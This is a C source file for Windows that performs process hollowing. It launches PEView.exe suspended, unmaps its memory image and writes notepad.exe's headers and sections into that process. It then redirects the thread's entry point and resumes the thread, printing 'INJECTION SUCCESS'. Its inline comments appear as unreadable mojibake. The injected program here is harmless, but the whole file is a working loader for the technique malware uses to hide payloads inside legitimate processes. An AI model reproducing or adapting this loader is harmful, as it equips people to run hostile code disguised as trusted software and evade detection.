#include<windows.h>
#include<stdio.h>

char path[MAX_PATH]="c:\\Users\\Admin\\Desktop\\PEView.exe";//��ע��Ŀ��ܽ���
char path2[MAX_PATH]="c:\\Users\\Admin\\Desktop\\notepad.exe";//ע��Ľ���
int CreateProc(char *,PROCESS_INFORMATION * );//�������ܽ���
int UnmapView(PROCESS_INFORMATION);//ж�ؿ��ܽ����ڴ�ӳ�� 
int Injection(PROCESS_INFORMATION);//ʵ��ע��
DWORD GetImageSize(char *);//��ȡSizeOfImage
DWORD GetEntryPoint();//��ȡOEP
DWORD GetImageBase();//��ȡ��ַ

CONTEXT context;//�����߳������Ľṹ
HANDLE hfile;//Ҫע����ļ��ľ��
char * pBuffer;//���ļ������ڴ��ָ��


DWORD align(int input, int alignment) {
    int mod = input % alignment;
    double div = (double) input / (double) alignment;
    if (mod == 0) {
        return alignment * div;
    } else {
        return alignment * (int) (div + 1);
    }

}




void main()
{
	PROCESS_INFORMATION  pi;
	if(!CreateProc(path,&pi))//�������ܽ���
		return;
	if(UnmapView(pi)!=0)//ж��ӳ��
		return;
	if(Injection(pi)==0)//ʵ��ע��
		return;
	printf("INJECTION SUCCESS");
	system("pause");

}
int CreateProc(char * path,PROCESS_INFORMATION * pi)
{
	STARTUPINFOA si;
	ZeroMemory(&si,sizeof(si));//��ʼ��Ϊ0
	si.cb=sizeof(si);
	ZeroMemory(pi,sizeof(pi));
	return CreateProcessA(path,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,pi);//�Թ���ķ�ʽ��������
}
int UnmapView(PROCESS_INFORMATION pi)
{
	typedef NTSTATUS (WINAPI *ZwUnmapViewOfSection)(HANDLE,LPVOID);//���庯��
	ZwUnmapViewOfSection UnmapViewOfSection = (ZwUnmapViewOfSection)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")),"ZwUnmapViewOfSection");//��ȡ������ַ
	context.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread,&context);//��ȡ�߳�������
	DWORD base;
	ReadProcessMemory(pi.hProcess,(LPVOID)(context.Ebx+8),&base,sizeof(DWORD),NULL);//��ȡ���ܽ��̻�ַ
	return UnmapViewOfSection(pi.hProcess,(LPVOID)base);//ж�ؿ��ܽ���ӳ��
}
int Injection(PROCESS_INFORMATION pi)
{
	DWORD ImageSize = GetImageSize(path2);//��ȡҪע����̵�ImageSize
	DWORD ImageBase = GetImageBase();//��ȡIMageBase
	context.Eax = (GetEntryPoint()+ImageBase);//��ȡҪע��Ľ��̵���ڵ�,eax�б�������ڵ�
	VirtualAllocEx(pi.hProcess,(LPVOID)ImageBase,ImageSize,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);//�ڿ��ܽ���������Ҫע��Ľ�������Ҫ�Ŀռ��С��ע����ע������ݵ�ImageBaseΪ��ַ�������Ͳ����޸��ض�λ��IAT
	if(!WriteProcessMemory(pi.hProcess,(LPVOID)ImageBase,pBuffer,PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->OptionalHeader.SizeOfHeaders,NULL))//��Ҫע���HEADERӳ�䵽���ܽ���
		return 0;
	PIMAGE_SECTION_HEADER psection =IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer));
	for(int i=0;i<PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->FileHeader.NumberOfSections;i++)
	{
		if(!WriteProcessMemory(pi.hProcess,(LPVOID)(ImageBase+psection->VirtualAddress),pBuffer+psection->PointerToRawData,psection->SizeOfRawData,NULL))//��Ҫע�������ӳ�䵽���ܽ���
			return 0;
		++psection;
	}
	if(!WriteProcessMemory(pi.hProcess,(BYTE *)context.Ebx+8,&ImageBase,sizeof(DWORD),NULL))//��Ҫע����޸��߳��������е�ImageBase
			return 0;
	SetThreadContext(pi.hThread,&context);//�����޸ĺ���߳�������



	////�����ļ�
 //   PIMAGE_DOS_HEADER pDosHeader = NULL;
 //   PIMAGE_NT_HEADERS pNTHeader = NULL;
 //   PIMAGE_FILE_HEADER pPEHeader = NULL;
 //   PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL;
 //   PIMAGE_SECTION_HEADER pSectionHeader = NULL;
 //   pDosHeader = (PIMAGE_DOS_HEADER) pBuffer;
 //   pNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pBuffer + pDosHeader->e_lfanew);
 //   pPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pNTHeader) + 4);
 //   pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) ((DWORD) pPEHeader + IMAGE_SIZEOF_FILE_HEADER);
 //   pSectionHeader = (PIMAGE_SECTION_HEADER) ((DWORD) pOptionHeader + pPEHeader->SizeOfOptionalHeader);
	//FILE *pf = fopen("goodBuffer", "wb+");


	//LPVOID pGoodBuffer = NULL;
	//pGoodBuffer = calloc(1, align(ImageSize,pOptionHeader->SectionAlignment));
	//memcpy(pGoodBuffer, pBuffer, PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->OptionalHeader.SizeOfHeaders);
	//PIMAGE_SECTION_HEADER psection2 =IMAGE_FIRST_SECTION(PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer));
	//for(int i=0;i<PIMAGE_NT_HEADERS(PIMAGE_DOS_HEADER(pBuffer)->e_lfanew+pBuffer)->FileHeader.NumberOfSections;i++)
	//{
	//	memcpy((LPVOID)((DWORD)pGoodBuffer + (psection2->VirtualAddress)), pBuffer+psection2->PointerToRawData,psection2->SizeOfRawData);
	//	++psection2;
	//}

	//if (pf == NULL) {
	//	printf("Unable to open file!");
	//}
	//fwrite(pGoodBuffer, ImageSize, 1, pf);
	//fclose(pf);











	ResumeThread(pi.hThread);//�ָ��߳�
	return 1;
}
DWORD GetImageSize(char *path)//�����ļ����ڴ�
{
	hfile = CreateFileA(path2,GENERIC_READ|GENERIC_WRITE,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);//��Ҫע����ļ�
	if(hfile == INVALID_HANDLE_VALUE)
		exit(0);
	DWORD filesize = GetFileSize(hfile,NULL);
	pBuffer = new char[filesize];
	ReadFile(hfile,pBuffer,filesize,&filesize,NULL);
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if(pDosHeader->e_magic!=0x5A4D)
		exit(0);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	return pNtHeaders->OptionalHeader.SizeOfImage;//����PE�ṹ�õ�SizeOfImage
}
DWORD GetEntryPoint()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	if(pDosHeader->e_magic!=0x5A4D)
		exit(0);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->AddressOfEntryPoint;//����PE�ṹ�õ�AddressOfEntryPoint
}
DWORD GetImageBase()
{
	PIMAGE_DOS_HEADER pDosHeader = PIMAGE_DOS_HEADER(pBuffer);
	PIMAGE_NT_HEADERS pNtHeaders = PIMAGE_NT_HEADERS(pDosHeader->e_lfanew+pBuffer);
	PIMAGE_OPTIONAL_HEADER OptionalHeader = &pNtHeaders->OptionalHeader;
	return OptionalHeader->ImageBase;//��PE�ṹ�ҵ�ImageBase

}